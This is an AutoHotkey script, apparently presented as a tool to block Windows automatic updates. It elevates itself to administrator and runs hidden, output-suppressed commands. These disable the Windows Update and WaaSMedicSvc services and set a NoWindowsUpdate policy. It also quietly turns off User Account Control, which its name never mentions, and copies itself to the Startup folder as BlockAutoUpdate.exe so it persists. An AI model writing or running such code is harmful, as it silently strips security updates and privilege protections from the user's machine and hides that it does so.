#NoEnv  ; Recommended for performance and compatibility with future AutoHotkey releases.
; #Warn  ; Enable warnings to assist with detecting common errors.
SendMode Input  ; Recommended for new scripts due to its superior speed and reliability.
SetWorkingDir %A_ScriptDir%  ; Ensures a consistent starting directory.

full_command_line := DllCall("GetCommandLine", "str")

if not (A_IsAdmin or RegExMatch(full_command_line, " /restart(?!\S)"))
{
    try
    {
        if A_IsCompiled
            Run *RunAs "%A_ScriptFullPath%" /restart
        else
            Run *RunAs "%A_AhkPath%" /restart "%A_ScriptFullPath%"
    }
    ExitApp
}

cmdSilenceReturn(command){
	try{
		RunWait,% ComSpec " /C " command,, Hide
	}catch{}
}

cmdSilenceReturn(">nul 2>&1 net stop wuauserv")
cmdSilenceReturn(">nul 2>&1 sc config wuauserv start=disabled")
cmdSilenceReturn(">nul 2>&1 REG add ""HKLM\SYSTEM\CurrentControlSet\Services\WaaSMedicSvc"" /v ""Start"" /t REG_DWORD /d ""4"" /f")
cmdSilenceReturn(">nul 2>&1 REG add ""HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer"" /v ""NoWindowsUpdate"" /t REG_DWORD /d ""1"" /f")
cmdSilenceReturn(">nul 2>&1 REG add ""HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"" /v EnableLUA /t REG_DWORD /d 0 /f")
FileCopy, % A_ScriptFullPath, % A_Startup "\BlockAutoUpdate.exe"

Exit, 0